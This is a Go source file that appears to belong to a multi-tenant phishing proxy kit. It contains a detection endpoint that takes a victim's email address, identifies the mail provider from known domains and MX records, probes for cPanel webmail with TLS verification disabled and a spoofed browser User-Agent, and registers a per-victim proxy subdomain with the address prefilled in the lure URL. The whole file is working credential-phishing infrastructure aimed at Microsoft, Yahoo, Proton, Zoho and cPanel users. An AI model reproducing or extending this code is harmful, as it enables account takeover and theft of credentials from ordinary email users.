package main

import (
	"crypto/tls"
	"encoding/json"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"time"
)

// ══════════════════════════════════════════════════════════
//  SMART DETECTION: MX-based login routing + dynamic cPanel
// ══════════════════════════════════════════════════════════

type DetectRequest struct {
	Email string `json:"email"`
}

type DetectResponse struct {
	Target    string `json:"target"`
	TargetURL string `json:"target_url"`
	Domain    string `json:"domain"`
	Provider  string `json:"provider"`
}

func handleDetect(w http.ResponseWriter, r *http.Request) {
	if r.Method == "OPTIONS" {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		w.WriteHeader(204)
		return
	}
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", 405)
		return
	}

	var req DetectRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Bad request", 400)
		return
	}

	parts := strings.SplitN(req.Email, "@", 2)
	if len(parts) != 2 || parts[1] == "" {
		http.Error(w, "Invalid email", 400)
		return
	}
	domain := strings.ToLower(strings.TrimSpace(parts[1]))
	domain = strings.TrimRight(domain, "=")

	// Tenant base domain for this request — the detected login is routed to a
	// subdomain of THIS domain (e.g. yahoo.customer7.com), not a hardcoded one.
	baseDomain := baseDomainOf(r)

	provider, matched := detectProvider(domain)

	// No known provider matched → probe for a self-hosted cPanel/webmail login
	// at webmail.<domain> (per-customer, can't be matched by a static MX rule).
	if !matched {
		if ok, webmailHost := probeCpanel(domain); ok {
			// Role is derived from the email domain; the full proxy subdomain is
			// role+"."+baseDomain (per-tenant). newCpanelTarget receives the bare
			// role (its phishDomain TrimSuffix is a no-op for a bare role).
			role := "wm-" + strings.ReplaceAll(domain, ".", "-")
			proxySub := role + "." + baseDomain
			registerDynamicTarget(proxySub, newCpanelTarget(role, webmailHost, domain))

			log.Printf("[>] [detect] %s → domain=%s provider=cpanel webmail=%s", req.Email, domain, webmailHost)
			writeDetect(w, DetectResponse{
				Target:    "cpanel",
				TargetURL: "https://" + proxySub + "/#" + req.Email,
				Domain:    domain,
				Provider:  "cpanel",
			})
			return
		}
	}

	target := providerToTarget(provider)
	t, ok := targets[target]
	if !ok {
		log.Printf("[detect] target %q not configured — falling back to microsoft", target)
		target = "microsoft"
		t = targets[target]
	}

	log.Printf("[>] [detect] %s → domain=%s provider=%s target=%s", req.Email, domain, provider, target)
	writeDetect(w, DetectResponse{
		Target:    target,
		TargetURL: "https://" + t.EntrySubdomainFor(baseDomain) + "/#" + req.Email,
		Domain:    domain,
		Provider:  provider,
	})
}

func writeDetect(w http.ResponseWriter, resp DetectResponse) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(w).Encode(resp)
}

// ══════════════════════════════════════════════════════════
//  MX LOOKUP ENGINE
// ══════════════════════════════════════════════════════════

var knownDomains = map[string]string{
	// ── Microsoft PERSONAL / consumer (MSA → login.live.com) ──
	"outlook.com": "msa", "hotmail.com": "msa",
	"live.com": "msa", "msn.com": "msa", "passport.com": "msa",
	"outlook.co.uk": "msa", "hotmail.co.uk": "msa", "live.co.uk": "msa",
	"outlook.ca": "msa", "hotmail.ca": "msa", "live.ca": "msa",
	"outlook.fr": "msa", "hotmail.fr": "msa", "live.fr": "msa",
	"outlook.de": "msa", "hotmail.de": "msa", "live.de": "msa",
	"outlook.es": "msa", "hotmail.es": "msa", "live.es": "msa",
	"outlook.it": "msa", "hotmail.it": "msa", "live.it": "msa",
	"outlook.com.au": "msa", "hotmail.com.au": "msa",
	"outlook.com.br": "msa", "hotmail.com.br": "msa",
	"outlook.co.jp": "msa", "hotmail.co.jp": "msa",

	// ── Yahoo CONSUMER ──
	"yahoo.com": "yahoo", "ymail.com": "yahoo",
	"rocketmail.com": "yahoo", "yahoo.co.uk": "yahoo",
	"yahoo.ca": "yahoo", "yahoo.fr": "yahoo",
	"yahoo.de": "yahoo", "yahoo.es": "yahoo",
	"yahoo.it": "yahoo", "yahoo.com.au": "yahoo",
	"yahoo.co.jp": "yahoo", "yahoo.com.br": "yahoo",

	// ── Turbify ──
	"turbify.com": "turbify",

	// ── Rackspace ──
	"rackspace.com": "rackspace",

	// ── ProtonMail ──
	"protonmail.com": "protonmail", "proton.me": "protonmail", "pm.me": "protonmail",

	// ── Zoho ──
	"zoho.com": "zoho", "zohomail.com": "zoho",

	// ── Apple ──
	"icloud.com": "apple", "me.com": "apple", "mac.com": "apple",

	// ── AOL ──
	"aol.com": "aol",
}

var mxPatterns = []struct {
	pattern  string
	provider string
}{
	{"mail.protection.outlook", "microsoft"},
	{"mail.eo.outlook", "microsoft"},
	{"outlook.com", "microsoft"},
	{"yahoodns.net", "turbify"},
	{"yahoo.com", "turbify"},
	{"emailsrvr.com", "rackspace"},
	{"protonmail.ch", "protonmail"},
	{"protonmail.com", "protonmail"},
	{"zoho.com", "zoho"},
	{"zohomail.com", "zoho"},
	{"zoho.eu", "zoho"},
}

// detectProvider returns the provider and whether it was a DEFINITIVE match
// (known domain or MX pattern). matched=false means "unknown — defaulted to
// microsoft", which is the cue to probe for cPanel webmail.
func detectProvider(domain string) (string, bool) {
	if provider, ok := knownDomains[domain]; ok {
		return provider, true
	}

	mxRecords, err := net.LookupMX(domain)
	if err != nil || len(mxRecords) == 0 {
		return "microsoft", false
	}

	for _, mx := range mxRecords {
		host := strings.ToLower(mx.Host)
		for _, p := range mxPatterns {
			if strings.Contains(host, p.pattern) {
				return p.provider, true
			}
		}
	}

	return "microsoft", false
}

// probeCpanel fetches https://webmail.<domain>/ and reports whether it serves a
// cPanel webmail. Sends browser-like headers — cPanel's Apache (mod_security)
// rejects the bare Go client with "406 Not Acceptable". Primary signal is the
// "Server: cpsrvd/…" header; body signatures are the fallback (cPanel often
// fronts webmail with Apache, so the Server header may just say "apache").
func probeCpanel(domain string) (bool, string) {
	webmailHost := "webmail." + domain
	client := &http.Client{
		Timeout:   8 * time.Second,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	}
	req, err := http.NewRequest("GET", "https://"+webmailHost+"/", nil)
	if err != nil {
		return false, ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[detect] cpanel probe %s: request failed: %v", webmailHost, err)
		return false, ""
	}
	defer resp.Body.Close()

	server := strings.ToLower(resp.Header.Get("Server"))
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 500000))
	html := strings.ToLower(string(body))

	log.Printf("[detect] cpanel probe %s: status=%d server=%q bodylen=%d",
		webmailHost, resp.StatusCode, server, len(body))

	// Primary: cPanel identifies itself in the Server header.
	if strings.Contains(server, "cpsrvd") || strings.Contains(server, "cpanel") {
		return true, webmailHost
	}
	// Fallback: known webmail-client / cPanel markers in the body.
	for _, sig := range []string{
		"roundcube", "_task=login", "rcube", "horde", "squirrelmail",
		"cpanel", "webmail login", "cpsrvd", "paper_lantern", "jupiter",
	} {
		if strings.Contains(html, sig) {
			return true, webmailHost
		}
	}
	return false, ""
}

func providerToTarget(provider string) string {
	switch provider {
	case "microsoft":
		return "microsoft"
	case "msa":
		return "msa"
	case "yahoo":
		return "yahoo"
	case "turbify":
		return "turbify"
	case "rackspace":
		return "rackspace"
	case "zoho":
		return "zoho"
	case "protonmail":
		return "proton" // Proton Mail → account.proton.me
	default:
		return "microsoft"
	}
}
